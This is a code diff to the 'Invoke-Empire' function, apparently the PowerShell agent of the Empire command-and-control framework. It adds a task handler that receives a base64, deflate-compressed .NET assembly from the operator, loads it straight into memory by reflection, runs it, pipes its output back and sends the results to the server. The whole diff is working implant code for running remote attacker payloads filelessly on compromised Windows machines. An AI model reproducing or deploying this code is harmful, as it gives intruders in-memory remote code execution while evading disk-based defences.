@@ -942,6 +942,73 @@ function Invoke-Empire {
                 }
                 Encode-Packet -data $output -type $type -ResultID $ResultID
             }
+            elseif($type -eq 44){
+                $parts = $data.split(",")
+                $params = $parts[1..$parts.length]
+                $bytes = [System.Convert]::FromBase64String($parts[0])
+                $ms = New-Object System.IO.MemoryStream
+                $output = New-Object System.IO.MemoryStream
+                $ms.Write($bytes, 0, $bytes.Length)
+                $ms.Seek(0,0) | Out-Null
+                $sr = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
+                $buffer = [System.Byte[]]::CreateInstance([System.Byte],4096)
+                $bytesRead = $sr.Read($buffer, 0, $buffer.length)
+                while($bytesRead -ne 0){
+                    $output.Write($buffer,0,$bytesRead)
+                    $bytesRead = $sr.Read($buffer, 0, $buffer.length)
+
+                }
+                $assemBytes = $output.ToArray()
+                $assem = [Reflection.Assembly]::load($assemBytes)
+                #execute the assembly
+                $strmprop = $assem.GetType("Task").GetProperty("OutputStream");
+                if(!$strmprop){
+                    Write-Host("no output pipe")
+                    $Results = $assem.GetType("Task").GetMethod("Execute").Invoke($null, $params)
+                }
+                else{
+                    Write-Host("output pipe")
+                    #pipes to retrieve the output
+                    $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable);
+                    $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle);
+                    $streamReader = [System.IO.StreamReader]::new($pipeServerStream);
+                    $dict = @{"assembly" = $assem; "params" = $params; "pipe" = $pipeClientStream};
+                    # background the task. Essentially creating a "thread" for the task to run in
+                    $ps = [PowerShell]::Create()
+                    $task = $ps.AddScript(@'
+                    [CmdletBinding()]
+                    param(
+                        [System.Reflection.Assembly]
+                        $assembly,
+
+                        [String[]]
+                        $params,
+
+                        [IO.Pipes.AnonymousPipeClientStream]
+                        $Pipe
+
+                    )
+                    try {
+                        $streamProp = $assembly.GetType("Task").GetProperty("OutputStream");
+                        $streamProp.SetValue($null, $pipe, $null);
+                        $assembly.GetType("Task").GetMethod("Execute").Invoke($null,$params);
+                        }
+                    finally {
+                        $pipe.Dispose();
+                        }
+'@).AddParameters($dict).BeginInvoke();
+                    $pipeOutput = [Text.StringBuilder]::new()
+                    $buffer = [char[]]::new($pipeServerStream.InBufferSize)
+                    Write-Host("starting -read")
+                    while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
+                        Write-Host("reading")
+                        [void]$pipeOutput.Append($buffer, 0, $read)
+                    }
+                    $ps.EndInvoke($task);
+                    $Results = $pipeOutput.ToString();
+                }
+                Encode-Packet -data $results -type 40 -ResultID $ResultID
+            }
 
             # return the currently running jobs
             elseif($type -eq 50) {
